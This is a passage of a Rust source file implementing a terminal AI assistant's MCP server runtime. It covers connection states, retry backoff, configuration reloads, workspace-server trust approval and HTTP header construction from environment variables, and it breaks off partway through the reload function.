//! The live MCP servers of one session, and everything that asks them.
//!
//! One [`McpRuntime`] per TUI session, shared by the UI thread (the `/mcp`
//! menu reads its snapshots) and the runtime thread (a turn's tools call it).
//! It owns the servers' connections and the state machine upstream's
//! `health.zig` classifies (`vercel-labs/fx@c1db9191
//! src/core/mcp/health.zig:8-69`): a server is `Disabled` (switched off, or a
//! workspace server nobody approved), `Connecting`, `Ready`, or `Failed`, and
//! a remote one that answered 401 also needs authentication.
//!
//! # Connecting
//!
//! Each enabled, admitted server is connected on a thread of its own, so a
//! slow one never holds up the others or the session: the child is started
//! (or the endpoint opened), `initialize` is asked with upstream's legacy
//! default -- `2025-11-25`, any of the four legacy versions accepted back
//! (`protocol_negotiation.zig:7-19`, `:66-117`) -- `notifications/initialized`
//! is sent, and `tools/list` is read page by page, all inside the server's
//! `startup_timeout_ms`.
//!
//! A server that fails to come up is `Retrying` and is tried again by itself
//! once its backoff is over, at most eight tries in a row, the backoffs
//! doubling from 1 s up to 30 s; the eighth failure makes it `Failed`
//! (fx v0.0.16's engine gate: `max_attempts = 8`, `reconnectDelay`,
//! `vercel-labs/fx@481104fd src/mcp/core/engine.zig:24-28`, `:193-216`;
//! `src/mcp/core/request.zig:76-79`). That is about 91 seconds of backoff:
//! fx's `p5-mcp-failed` capture is still silent at 84 s and says
//! `bad failed · /mcp` at 100 s (`.prd/tui-phase5/receipts/mcp-status/`). A
//! server whose failure no try can change -- it needs a sign-in, a variable
//! that is not set, a transport xfx does not connect -- fails at once
//! ([`worth_retrying`]). Why it is down is said in fx's words, with how a
//! stdio server's process ended and its last stderr lines
//! ([`failure_words`]).
//!
//! # Reloading
//!
//! A reload reads both files again and takes the change in place
//! (`Runtime.reload`, `vercel-labs/fx@481104fd
//! src/core/mcp_host/runtime.zig:628-642`; `src/mcp/engine.zig:167-186`): a
//! server whose configuration is the same keeps running as it is -- ready,
//! still coming up, retrying or failed -- and only one added or changed starts
//! fresh, once the old one of its name is stopped. The new set is in force at
//! once, and the reload says nothing: what the servers do next is the status
//! line's and `/mcp`'s to show. Only a configuration that cannot be read again
//! is told, in one warning (`collectMcpHostFacts`,
//! `src/core/app/app_commands.zig:340-345@481104fd`).
//!
//! # Commands are answered in order
//!
//! Every `/mcp` command, every choice made in its menu and every trust choice
//! goes to one worker thread in the order it was given, and what it says
//! comes back as [`Event`]s the UI drains: a `show` that waits on a slow
//! server cannot be overtaken by the `remove` typed after it, and the UI
//! thread never waits on a server.

use std::collections::{HashMap, VecDeque};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc;
use std::sync::{Arc, Condvar, Mutex, PoisonError};
use std::time::{Duration, Instant};

use serde_json::{json, Map, Value};

use super::config::{
    self, Admission, Choices, ServerConfig, Source, Transport as Kind, TrustAction,
};
use super::transport::{Exit, HttpTransport, StdioTransport, Transport};
use super::{names::ToolNames, McpError};
use crate::gateway::CancelToken;

/// The version `initialize` asks for (`connectServerLegacy(..., .v2025_11_25)`,
/// `server_transport.zig:126-128`).
pub const REQUESTED_VERSION: &str = "2025-11-25";

/// The legacy versions a stdio server may answer with (`LegacyStdioVersion`).
const STDIO_VERSIONS: [&str; 4] = ["2025-11-25", "2025-06-18", "2025-03-26", "2024-11-05"];

/// The legacy versions a streamable HTTP server may answer with
/// (`legacy_streamable_http.zig:14-25`).
const HTTP_VERSIONS: [&str; 3] = ["2025-11-25", "2025-06-18", "2025-03-26"];

/// How many pages of a list are read before the list is called complete.
const MAX_PAGES: usize = 64;

/// How a server that fails to come up is tried again: up to `attempts` tries
/// in a row, the wait after the `n`th failure `first` doubled `n - 1` times
/// (at most five) and never more than `cap`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct Retry {
    pub(crate) attempts: u8,
    pub(crate) first: Duration,
    pub(crate) cap: Duration,
}

impl Retry {
    /// fx v0.0.16's: eight tries (`Config.max_attempts`,
    /// `vercel-labs/fx@481104fd src/mcp/core/engine.zig:24-28`), and
    /// `reconnectDelay` -- 1 s doubling up to 30 s
    /// (`src/mcp/core/request.zig:76-79`) -- after each failed one but the
    /// last (`engine.zig:193-211`): 1, 2, 4, 8, 16, 30 and 30 seconds.
    pub(crate) const FX: Self = Self {
        attempts: 8,
        first: Duration::from_secs(1),
        cap: Duration::from_secs(30),
    };

    /// The wait after the `failed`th failure in a row (`reconnectDelay(
    /// attempts - 1)`).
    pub(crate) fn backoff(&self, failed: u8) -> Duration {
        let doublings = u32::from(failed.saturating_sub(1).min(5));
        (self.first * 2u32.pow(doublings)).min(self.cap)
    }
}

/// The longest a stop waits for a try to end. A stop closes the connection
/// a try has handed over, which ends its handshake at once; what is left is
/// the try's own close of a process it still holds -- the group's grace
/// (0.5 s) and, for a `docker run`, its container's removal (15 s,
/// [`super::docker`]) -- the same close a stop of a ready server waits for.
const STOP_WAIT: Duration = Duration::from_secs(20);

/// A try under way ([`Live::opening`]), from before it starts a process
/// until it has published that process or closed it: marked when it begins
/// and cleared, with whoever waits on it told, however it ends.
struct Opening<'a>(&'a Server);

impl<'a> Opening<'a> {
    /// Marks a try on `server`, unless it was stopped or another try is
    /// under way (a call's restart beside another): one try at a time owns
    /// the server's process.
    fn begin(server: &'a Server) -> Option<Self> {
        let mut live = server.live();
        if server.stopped.load(Ordering::Acquire) || live.opening || live.starting.is_some() {
            return None;
        }
        live.opening = true;
        Some(Self(server))
    }
}

/// Where a test may hold a try (the tests of a `fault-injection` build only;
/// no binary carries it): just before
/// its process is handed over, and once a failed one has its process back
/// and is about to close it itself.
#[cfg(all(test, feature = "fault-injection"))]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Hold {
    BeforeHandOver,
    BeforeOwnClose,
}

#[cfg(all(test, feature = "fault-injection"))]
type HoldHook = Arc<dyn Fn(Hold) + Send + Sync>;

impl Drop for Opening<'_> {
    fn drop(&mut self) {
        self.0.live().opening = false;
        self.0.opened.notify_all();
    }
}

/// How long a server's wait between tries sleeps at a time, looking at
/// whether it was stopped in between: a reload or `/quit` never waits out a
/// 30-second backoff.
const BACKOFF_SLICE: Duration = Duration::from_millis(25);

/// The most bytes of a stdio server's last stderr lines a failure quotes,
/// and how many lines (`tail_max`, `tail_lines`,
/// `vercel-labs/fx@481104fd src/mcp/io/process.zig:188-190`).
const STDERR_TAIL_MAX_BYTES: usize = 240;
const STDERR_TAIL_LINES: usize = 3;

/// `ConnectionState` (`health.zig:8-14`), with fx v0.0.16's `retrying`:
/// down by a failure and waiting out its backoff before it is tried again
/// (`.backoff => .retrying`, `vercel-labs/fx@481104fd
/// src/core/mcp_host/runtime.zig:1866-1870`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Connection {
    Disconnected,
    Disabled,
    Connecting,
    Retrying,
    Ready,
    Failed,
}

/// `health.Status` (`health.zig:41-69`): one classification every surface
/// derives from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    Disabled,
    Connecting,
    Retrying,
    Ready,
    NeedsAuth,
    Failed,
    Unavailable,
}

/// What a server said it can do (`initialize`'s `capabilities`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct Capabilities {
    pub tools: bool,
    pub resources: bool,
    pub prompts: bool,
    pub completions: bool,
}

/// One tool a server listed.
#[derive(Debug, Clone, PartialEq)]
pub struct McpTool {
    /// The server's own name for it.
    pub name: String,
    /// The name the model calls it by, `mcp_<server>_<tool>` ([`ToolNames`]).
    pub alias: String,
    pub title: Option<String>,
    pub description: String,
    pub input_schema: Value,
    /// `tagsFor` (`tool_names.zig:146-154`): `mcp`, then the identifier
    /// tokens of the server's name and the tool's, lowercased and unique.
    pub tags: Vec<String>,
}

/// One configured server, as every surface sees it at one moment.
#[derive(Debug, Clone, PartialEq)]
pub struct ServerView {
    pub name: String,
    pub source: Source,
    pub transport: Kind,
    pub admission: Option<Admission>,
    pub connection: Connection,
    pub needs_auth: bool,
    pub required: bool,
    pub reloading: bool,
    pub protocol_version: Option<String>,
    pub capabilities: Capabilities,
    /// Known only once the server is ready.
    pub tool_count: Option<usize>,
    /// The tools the server's catalog holds, whatever its state: none for
    /// one that never connected (upstream's tool catalog, available from the
    /// start, `catalog_state.zig:23-28`).
    pub tools_held: usize,
    /// What its feature lists held when last read.
    pub listed: Listed,
    pub failure: Option<String>,
    /// For a project server not approved as it stands -- pending or
    /// rejected, so never expanded -- what approving it would let run or
    /// reach, and the digest an approval of what was drawn is for.
    pub entry: Option<Arc<ShownEntry>>,
}

/// A project entry as it is written, for a person asked about it: its rows
/// ([`entry_rows`]), each whole, and the [`config::entry_digest`] of the
/// entry they came from -- what an approval of it is for.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShownEntry {
    pub rows: Vec<String>,
    pub digest: String,
}

impl ServerView {
    /// The `Capabilities` fact of the menu's details (`capabilitySummary`
    /// over `counts`, `mcp_menu_presentation.zig:443-460`,
    /// `server_views.zig:130-150`): a capability the server did not
    /// advertise is `0`, one it did is its count once listed and `?` before;
    /// tools are counted from the start, and are `?` only while the server is
    /// still coming up.
    pub fn capability_summary(&self) -> String {
        let count = |advertised: bool, listed: Option<usize>| match (advertised, listed) {
            (false, _) => "0".to_string(),
            (true, Some(count)) => count.to_string(),
            (true, None) => "?".to_string(),
        };
        let tools = if self.connection == Connection::Connecting {
            "?".to_string()
        } else {
            self.tools_held.to_string()
        };
        format!(
            "tools={tools} resources={} templates={} prompts={}",
            count(self.capabilities.resources, self.listed.resources),
            count(self.capabilities.resources, self.listed.templates),
            count(self.capabilities.prompts, self.listed.prompts),
        )
    }
}

impl ServerView {
    /// `classify` (`health.zig:55-69`).
    pub fn status(&self) -> Status {
        if self.connection == Connection::Disabled {
            return Status::Disabled;
        }
        if self.needs_auth {
            return Status::NeedsAuth;
        }
        match self.connection {
            Connection::Disabled => Status::Disabled,
            Connection::Connecting => Status::Connecting,
            Connection::Retrying => Status::Retrying,
            Connection::Ready => Status::Ready,
            Connection::Failed => Status::Failed,
            Connection::Disconnected => Status::Unavailable,
        }
    }

    /// The menu's state column (`serverStateLabel`,
    /// `mcp_menu_presentation.zig:404-416`).
    pub fn state_label(&self) -> &'static str {
        if self.reloading {
            return "Reloading";
        }
        if self.admission == Some(Admission::Pending) {
            return "Pending trust";
        }
        match self.status() {
            Status::NeedsAuth => "Needs authentication",
            Status::Unavailable => "Disconnected",
            Status::Disabled => "Disabled",
            Status::Connecting => "Connecting",
            Status::Retrying => "Retrying",
            Status::Ready => "Ready",
            Status::Failed => "Failed",
        }
    }
}

/// One resource or resource template a server listed.
#[derive(Debug, Clone, PartialEq)]
pub struct Resource {
    pub uri: String,
    pub name: String,
    pub title: Option<String>,
    pub description: Option<String>,
    pub mime_type: Option<String>,
    pub template: bool,
}

/// One argument of a prompt.
#[derive(Debug, Clone, PartialEq)]
pub struct PromptArgument {
    pub name: String,
    pub required: bool,
    pub description: Option<String>,
}

/// One prompt a server listed.
#[derive(Debug, Clone, PartialEq)]
pub struct Prompt {
    pub name: String,
    pub title: Option<String>,
    pub description: Option<String>,
    pub arguments: Vec<PromptArgument>,
}

/// Where a reload's outcome is told.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Origin {
    /// The session's first load: nothing is said unless a server failed.
    Startup,
    /// A notice in the transcript.
    Transcript,
}

/// Something the UI has to show.
#[derive(Debug, Clone, PartialEq)]
pub enum Event {
    /// A notice under `mcp`, neutral or a warning -- a usage line too, as fx
    /// v0.0.16 files a verb's output (`collectMcpHostFacts`,
    /// `src/core/app/app_commands.zig:340-354@481104fd`).
    Notice { warning: bool, body: String },
    /// The servers changed: the menu repaints.
    Changed,
}

/// The files a runtime reads its servers from.
#[derive(Debug, Clone, Default)]
pub struct Paths {
    /// `~/.xfx/mcp.json`, when there is a profile.
    pub profile: Option<PathBuf>,
    /// `~/.xfx/settings.json`, where trust choices are kept.
    pub settings: Option<PathBuf>,
    /// The workspace whose `.mcp.json` is read.
    pub workspace: PathBuf,
}

/// One unit of work for the runtime's worker thread.
pub enum Job {
    /// A `/mcp` command line, without the `/mcp`.
    Command(String),
    /// A trust choice, and the sentence that announces it; none for a
    /// choice made in `/mcp`'s menu, which says only what warns.
    Trust { action: TrustAction, body: String },
    /// A choice made in `/mcp`'s menu: a verb and its words, never split
    /// again, run warnings-only ([`super::command::choose`]).
    Choice(Vec<String>),
}

/// A server's live half.
struct Live {
    connection: Connection,
    needs_auth: bool,
    failure: Option<String>,
    transport: Option<Arc<dyn Transport>>,
    /// The connection a try is still opening -- started, not yet through its
    /// handshake -- so a stop reaches it too ([`Server::stop`]).
    starting: Option<Arc<dyn Transport>>,
    /// A try is under way: from just before it starts a process until that
    /// process is either published, closed, or handed to `starting`. A stop
    /// waits it out ([`Server::stop`]).
    opening: bool,
    protocol_version: Option<String>,
    instructions: Option<String>,
    capabilities: Capabilities,
    tools: Vec<McpTool>,
    /// How many resources, resource templates and prompts the server listed
    /// the last time anything asked, on this connection; `None` until then
    /// (upstream's feature catalogs, `catalog_state.zig:36-66`).
    listed: Listed,
    /// Restarts spent since the last good start.
    restarts: u8,
}

/// What a server's feature lists held when they were last read.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Listed {
    pub resources: Option<usize>,
    pub templates: Option<usize>,
    pub prompts: Option<usize>,
}

/// One configured server and its connection.
pub struct Server {
    pub config: ServerConfig,
    live: Mutex<Live>,
    /// Set when the server is being stopped, so a connection in progress
    /// does not publish itself afterwards.
    stopped: AtomicBool,
    /// Set by the one reload that starts its connection, so a server carried
    /// over while it is still coming up is connected once and only once.
    claimed: AtomicBool,
    /// Told when a try is over ([`Live::opening`]).
    opened: Condvar,
    /// What a person is shown of it before approving it, built once when the
    /// reload that read it built the server ([`shown_entry`]): every view
    /// shares it rather than spelling the entry again per frame.
    entry: Option<Arc<ShownEntry>>,
    /// Whether the model's catalog has read its tool list
    /// ([`crate::mcp::catalog::servers_block`]), as fx's catalog keeps one
    /// list state per server (`vercel-labs/fx@481104fd
    /// src/core/mcp_host/model.zig:56-70`): carried with the server by a
    /// reload that keeps it, and not by one that starts it anew (`:101-125`).
    tools_known: AtomicBool,
}

impl Server {
    /// `config` as a server, with its [`ShownEntry`] from `digests`, the last
    /// read's digests by name.
    fn new(config: ServerConfig, digests: &HashMap<&str, &str>) -> Arc<Self> {
        let entry = shown_entry(&config, digests).map(Arc::new);
        let disabled = !config.enabled
            || matches!(
                config.admission,
                Some(Admission::Pending | Admission::Rejected)
            );
        Arc::new(Self {
            config,
            live: Mutex::new(Live {
                connection: if disabled {
                    Connection::Disabled
                } else {
                    Connection::Connecting
                },
                needs_auth: false,
                failure: None,
                transport: None,
                starting: None,
                opening: false,
                protocol_version: None,
                instructions: None,
                capabilities: Capabilities::default(),
                tools: Vec::new(),
                listed: Listed::default(),
                restarts: 0,
            }),
            stopped: AtomicBool::new(false),
            claimed: AtomicBool::new(false),
            opened: Condvar::new(),
            entry,
            tools_known: AtomicBool::new(false),
        })
    }

    /// Whether the model's catalog has read its tool list.
    pub fn tools_known(&self) -> bool {
        self.tools_known.load(Ordering::Acquire)
    }

    /// Records what the model's catalog last read of its tool list: the
    /// list (`true`), or a failure or a needed login (`false`).
    pub fn set_tools_known(&self, known: bool) {
        self.tools_known.store(known, Ordering::Release);
    }

    fn live(&self) -> std::sync::MutexGuard<'_, Live> {
        self.live.lock().unwrap_or_else(PoisonError::into_inner)
    }

    /// Its state as every surface reads it: a ready server whose connection
    /// has gone is a failed one (`observedConnection`, `health.zig:16-22`).
    fn observed(live: &Live) -> Connection {
        match (&live.transport, live.connection) {
            (Some(transport), Connection::Ready) if !transport.alive() => Connection::Failed,
            (_, connection) => connection,
        }
    }

    fn view(&self, reloading: bool) -> ServerView {
        let live = self.live();
        let connection = Self::observed(&live);
        ServerView {
            name: self.config.name.clone(),
            source: self.config.source,
            transport: self.config.transport,
            admission: self.config.admission,
            connection,
            needs_auth: live.needs_auth,
            required: self.config.required,
            reloading,
            protocol_version: live.protocol_version.clone(),
            capabilities: live.capabilities,
            tool_count: (connection == Connection::Ready).then_some(live.tools.len()),
            tools_held: live.tools.len(),
            listed: live.listed,
            // Why it is down, while it is: a server coming up again, or back,
            // has no failure to explain (`publish`, `vercel-labs/fx@481104fd
            // src/core/mcp_host/runtime.zig:1873-1877`).
            failure: matches!(connection, Connection::Retrying | Connection::Failed)
                .then(|| live.failure.clone())
                .flatten(),
            entry: self.entry.clone(),
        }
    }

    /// Whether a connection should be made for it.
    fn should_connect(&self) -> bool {
        self.live().connection == Connection::Connecting
    }

    /// The tools, while it is ready.
    pub fn tools(&self) -> Vec<McpTool> {
        let live = self.live();
        if live.connection == Connection::Ready {
            live.tools.clone()
        } else {
            Vec::new()
        }
    }

    pub fn instructions(&self) -> Option<String> {
        self.live().instructions.clone()
    }

    /// Waits `wait` between tries, a slice at a time; false once the
    /// server is stopped, so it is never tried again after that.
    fn pause(&self, wait: Duration) -> bool {
        let until = Instant::now() + wait;
        loop {
            if self.stopped.load(Ordering::Acquire) {
                return false;
            }
            let left = until.saturating_duration_since(Instant::now());
            if left.is_zero() {
                return true;
            }
            std::thread::sleep(left.min(BACKOFF_SLICE));
        }
    }

    /// Stops it, and returns only once nothing it started still runs: its
    /// connection and one a try is still opening are closed -- each close
    /// ends a process's group and collects it -- and a try that was about to
    /// hand its process over is waited out, up to [`STOP_WAIT`]. So a
    /// replacement of the same name never runs beside it, and a session that
    /// ends leaves none behind (fx holds what would start a server while the
    /// one a reload dropped under its name is stopping, and its end waits
    /// 3.5 s for every server: `Engine.stopping`, `Engine.deinit`,
    /// `vercel-labs/fx@481104fd src/mcp/engine.zig:145-161`, `:194-199`;
    /// `src/core/mcp_host/runtime.zig:832-840`).
    ///
    /// `stopped` is set before the lock is taken, and a try reads it under
    /// that lock before it hands its process over or publishes: so a try
    /// either finds it set and closes its own, or has handed it over before
    /// the lock below is taken, and is closed here.
    fn stop(&self) {
        self.stopped.store(true, Ordering::Release);
        let (transport, starting) = {
            let mut live = self.live();
            (live.transport.take(), live.starting.take())
        };
        for transport in [transport, starting].into_iter().flatten() {
            transport.close();
        }
        let deadline = Instant::now() + STOP_WAIT;
        let mut live = self.live();
        while live.opening {
            let left = deadline.saturating_duration_since(Instant::now());
            if left.is_zero() {
                break;
            }
            live = self
                .opened
                .wait_timeout(live, left)
                .unwrap_or_else(PoisonError::into_inner)
                .0;
        }
    }

    /// Hands `transport`, just started, to the server for the rest of its
    /// try; false, and closed, when the server was stopped first.
    fn hand_over(&self, transport: &Arc<dyn Transport>) -> bool {
        let mut live = self.live();
        if self.stopped.load(Ordering::Acquire) {
            drop(live);
            transport.close();
            return false;
        }
        live.starting = Some(Arc::clone(transport));
        true
    }

    /// Takes back the connection a try opened, when the try ends without
    /// publishing it.
    fn take_back(&self) -> Option<Arc<dyn Transport>> {
        self.live().starting.take()
    }
}

/// Everything the lock covers.
struct State {
    servers: Vec<Arc<Server>>,
    issues: Vec<String>,
    reloading: bool,
    /// A reload asked for while one was running, and where it is told.
    again: Option<Origin>,
    /// The configuration the last reload read, for one that only changes
    /// trust choices to compare against.
    choices: Choices,
    /// Each `.mcp.json` entry the last read found, with its digest: what an
    /// approval by name is for ([`config::apply_action`]).
    digests: Vec<(String, String)>,
}

/// How a workspace server's `${VAR}` is looked up.
type Lookup = dyn Fn(&str) -> Option<String> + Send + Sync;

/// What an HTTP server is sent besides the protocol's own headers
/// (`buildResolvedHeaders`, `vercel-labs/fx@c1db9191 src/core/mcp/
/// server_auth.zig:64-110`): its `headers` as written, then each `header_env`
/// header with the value of the variable it names, then `Authorization:
/// Bearer` with the value of `bearer_token_env`. A variable that is not set
/// fails the connection by upstream's name rather than sending the header
/// without it. The values are read when the server connects and go nowhere
/// but its URL.
pub(super) fn http_headers(
    config: &ServerConfig,
    environment: &Lookup,
) -> Result<Vec<(String, String)>, McpError> {
    let mut headers = config.headers.clone();
    for (name, variable) in &config.header_env {
        let value = environment(variable).ok_or(McpError::Named("McpHeaderEnvironmentMissing"))?;
        headers.push((name.clone(), value));
    }
    if let Some(variable) = &config.bearer_token_env {
        let token = environment(variable).ok_or(McpError::Named("McpBearerEnvironmentMissing"))?;
        headers.push(("Authorization".to_string(), format!("Bearer {token}")));
    }
    Ok(headers)
}

/// The session's MCP servers.
pub struct McpRuntime {
    paths: Paths,
    state: Mutex<State>,
    names: Mutex<ToolNames>,
    events: Mutex<VecDeque<Event>>,
    jobs: Mutex<Option<mpsc::Sender<Job>>>,
    /// Bumped by every reload that put a new set in force.
    generation: AtomicU64,
    /// When the servers were last started: the session's first load, and
    /// every reload after it, changed or not (`startHostServers`,
    /// `vercel-labs/fx@481104fd src/core/app/app_mcp_runtime.zig:199-210`,
    /// called by `reloadHost`, `:121-134`). The status line waits for them
    /// to finish starting from then ([`crate::tui::statusline::McpStatus`]).
    started: Mutex<Option<Instant>>,
    /// How many tries a server gets in a row, and how long it waits between
    /// them ([`Retry`]).
    retry: Mutex<Retry>,
    /// Set by [`Self::shutdown`]: no reload starts a server after it.
    closed: AtomicBool,
    #[cfg(all(test, feature = "fault-injection"))]
    hold: Mutex<Option<HoldHook>>,
    /// What the environment says, for a workspace server's `${VAR}` and an
    /// HTTP server's `header_env` and `bearer_token_env`. A workspace server
    /// never gets xfx's own credentials from it: `config::load_workspace`
    /// leaves them unset and refuses an entry that names one as a source.
    environment: Box<Lookup>,
}

impl std::fmt::Debug for McpRuntime {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("McpRuntime")
            .field("paths", &self.paths)
            .finish_non_exhaustive()
    }
}

impl McpRuntime {
    /// A runtime over `paths`, with nothing loaded and nothing started.
    pub fn new(paths: Paths) -> Arc<Self> {
        Arc::new(Self {
            paths,
            state: Mutex::new(State {
                servers: Vec::new(),
                issues: Vec::new(),
                reloading: false,
                again: None,
                choices: Choices::default(),
                digests: Vec::new(),
            }),
            names: Mutex::new(ToolNames::new(crate::tools::ADVERTISED_TOOLS)),
            events: Mutex::new(VecDeque::new()),
            jobs: Mutex::new(None),
            generation: AtomicU64::new(0),
            started: Mutex::new(None),
            retry: Mutex::new(Retry::FX),
            closed: AtomicBool::new(false),
            #[cfg(all(test, feature = "fault-injection"))]
            hold: Mutex::new(None),
            environment: Box::new(|name| std::env::var(name).ok()),
        })
    }

    /// When the servers were last started, or `None` before the first load:
    /// what the status line's 10-second wait counts from.
    pub fn started_at(&self) -> Option<Instant> {
        *self.started.lock().unwrap_or_else(PoisonError::into_inner)
    }

    fn mark_started(&self) {
        *self.started.lock().unwrap_or_else(PoisonError::into_inner) = Some(Instant::now());
    }

    /// A test's own schedule of tries, so a server that never comes up is
    /// `Failed` in milliseconds rather than fx's minute and a half.
    #[cfg(test)]
    pub(crate) fn set_retry(&self, retry: Retry) {
        *self.retry.lock().unwrap_or_else(PoisonError::into_inner) = retry;
    }

    fn retry(&self) -> Retry {
        *self.retry.lock().unwrap_or_else(PoisonError::into_inner)
    }

    /// Holds every try at the [`Hold`] points through `hook`.
    #[cfg(all(test, feature = "fault-injection"))]
    pub(crate) fn set_hold(&self, hook: impl Fn(Hold) + Send + Sync + 'static) {
        *self.hold.lock().unwrap_or_else(PoisonError::into_inner) = Some(Arc::new(hook));
    }

    #[cfg(all(test, feature = "fault-injection"))]
    fn held(&self, at: Hold) {
        let hook = self
            .hold
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .clone();
        if let Some(hook) = hook {
            hook(at);
        }
    }

    /// A runtime that reads no file: a test's, or a session with no profile.
    pub fn inert() -> Arc<Self> {
        Self::new(Paths::default())
    }

    pub fn paths(&self) -> &Paths {
        &self.paths
    }

    fn state(&self) -> std::sync::MutexGuard<'_, State> {
        self.state.lock().unwrap_or_else(PoisonError::into_inner)
    }

    /// Something for the UI.
    pub fn say(&self, event: Event) {
        self.events
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .push_back(event);
    }

    /// A notice under `mcp`.
    pub fn notice(&self, warning: bool, body: impl Into<String>) {
        self.say(Event::Notice {
            warning,
            body: body.into(),
        });
    }

    /// Everything said since the last call, oldest first.
    pub fn take_events(&self) -> Vec<Event> {
        self.events
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .drain(..)
            .collect()
    }

    /// Every configured server, in the order the files list them: the
    /// profile's, then the workspace's.
    pub fn views(&self) -> Vec<ServerView> {
        let state = self.state();
        state
            .servers
            .iter()
            .map(|server| server.view(state.reloading && server.should_connect()))
            .collect()
    }

    /// The configuration problems the last reload found.
    pub fn issues(&self) -> Vec<String> {
        self.state().issues.clone()
    }

    /// The [`config::entry_digest`] of `.mcp.json`'s entry `name` as the last
    /// read found it, parsed or not -- what an approval of that name binds to
    /// (`config::apply_action`) -- or `None` when that read had no such entry.
    pub fn loaded_digest(&self, name: &str) -> Option<String> {
        self.state()
            .digests
            .iter()
            .find(|(entry, _)| entry == name)
            .map(|(_, digest)| digest.clone())
    }

    /// The server called `name`.
    pub fn server(&self, name: &str) -> Option<Arc<Server>> {
        self.state()
            .servers
            .iter()
            .find(|server| server.config.name == name)
            .cloned()
    }

    fn servers(&self) -> Vec<Arc<Server>> {
        self.state().servers.clone()
    }

    pub fn generation(&self) -> u64 {
        self.generation.load(Ordering::Acquire)
    }

    // -----------------------------------------------------------------------
    // the worker
    // -----------------------------------------------------------------------

    /// Hands `job` to the worker thread, starting it the first time.
    pub fn submit(self: &Arc<Self>, job: Job) {
        let mut jobs = self.jobs.lock().unwrap_or_else(PoisonError::into_inner);
        if jobs.is_none() {
            let (sender, receiver) = mpsc::channel::<Job>();
            let runtime = Arc::downgrade(self);
            let spawned = std::thread::Builder::new()
                .name("xfx-mcp".into())
                .spawn(move || {
                    while let Ok(job) = receiver.recv() {
                        let Some(runtime) = runtime.upgrade() else {
                            return;
                        };
                        runtime.run(job);
                    }
                });
            if spawned.is_err() {
                drop(jobs);
                self.notice(
                    true,
                    "MCP is unavailable: its worker thread could not start.",
                );
                return;
            }
            *jobs = Some(sender);
        }
        if let Some(sender) = jobs.as_ref() {
            let _ = sender.send(job);
        }
    }

    /// Runs one job on the calling thread: the worker's, or a test's.
    pub fn run(self: &Arc<Self>, job: Job) {
        match job {
            Job::Command(line) => super::command::handle(self, &line),
            Job::Trust { action, body } => self.trust(action, &body),
            Job::Choice(args) => super::command::choose(self, &args),
        }
    }

    // -----------------------------------------------------------------------
    // loading, connecting, reloading
    // -----------------------------------------------------------------------

    /// The session's first load, on the worker thread.
    ///
    /// The configured servers are put in force before this returns -- each
    /// `Connecting` or `Disabled`, a pending project server held back until
    /// it is approved in `/mcp`'s menu or by `/mcp approve` (fx v0.0.16 has
    /// no launch prompt, `ba0ea4a9`) -- so the session's first frame and its
    /// record already name them; connecting them is the thread's.
    pub fn start(self: &Arc<Self>) {
        if self.paths.profile.is_none() && self.paths.settings.is_none() {
            return;
        }
        self.mark_started();
        if let Ok((configs, issues, choices, digests)) = self.read_configuration() {
            let mut state = self.state();
            let index = by_name(&digests);
            state.servers = configs
                .into_iter()
                .map(|config| Server::new(config, &index))
                .collect();
            state.issues = issues;
            state.choices = choices;
            state.digests = digests;
        }
        let runtime = Arc::clone(self);
        let _ = std::thread::Builder::new()
            .name("xfx-mcp-start".into())
            .spawn(move || runtime.reload(Origin::Startup));
    }

    /// [`Self::start`], and then its startup reload waited out: one read put
    /// in force, and no reload running or asked for after it -- failing the
    /// case if that takes longer than `wait`.
    ///
    /// A case's own job is then reloaded on the thread that runs it. Without
    /// the wait, a job that reloads while the startup thread still is hands
    /// its reload to that thread's next pass and returns ([`Self::reload`]),
    /// and the case asserts on what the startup read: a server it approved
    /// still `Disabled`. Waiting out `Connecting` is not the same thing -- a
    /// pending server is never `Connecting`, and a ready one is published
    /// before its reload ends.
    #[cfg(test)]
    pub(crate) fn start_and_wait(self: &Arc<Self>, wait: Duration) {
        self.start();
        let deadline = Instant::now() + wait;
        loop {
            {
                // Bumped inside the pass, before `reloading` is cleared, so
                // both are read: the first alone leaves that gap open.
                let state = self.state();
                if self.generation() >= 1 && !state.reloading && state.again.is_none() {
                    return;
                }
            }
            assert!(
                Instant::now() < deadline,
                "the startup reload did not finish within {wait:?}"
            );
            std::thread::sleep(Duration::from_millis(5));
        }
    }

    /// What both files say now: the servers, the workspace file's issues, the
    /// person's choices, and each workspace entry's digest.
    #[allow(clippy::type_complexity)]
    fn read_configuration(
        &self,
    ) -> Result<
        (
            Vec<ServerConfig>,
            Vec<String>,
            Choices,
            Vec<(String, String)>,
        ),
        McpError,
    > {
        // A profile entry that can't be read is a note, ahead of the
        // workspace's (`loadNativeConfigs`, `src/builtins/mcp.zig:45-56@481104fd`).
        let config::Profile {
            mut servers,
            notes: mut issues,
        } = match &self.paths.profile {
            Some(path) => config::load_profile(path).map_err(|err| McpError::Named(err.0))?,
            None => config::Profile::default(),
        };
        let choices = config::load_choices(self.paths.settings.as_deref(), &self.paths.workspace);
        let workspace = if self.paths.profile.is_some() || self.paths.settings.is_some() {
            config::load_workspace(&self.paths.workspace, &choices, &*self.environment)
        } else {
            config::WorkspaceServers::default()
        };
        // A workspace server named like a profile one is the profile's.
        for server in workspace.servers {
            if !servers.iter().any(|existing| existing.name == server.name) {
                servers.push(server);
            }
        }
        issues.extend(workspace.issues);
        Ok((servers, issues, choices, workspace.digests))
    }

    /// Reads both files again and connects what changed, telling `origin`
    /// how it went. A reload asked for while one runs runs after it.
    pub fn reload(self: &Arc<Self>, origin: Origin) {
        if self.closed.load(Ordering::Acquire) {
            return;
        }
        {
            let mut state = self.state();
            if state.reloading {
                state.again = Some(match state.again {
                    Some(Origin::Transcript) => Origin::Transcript,
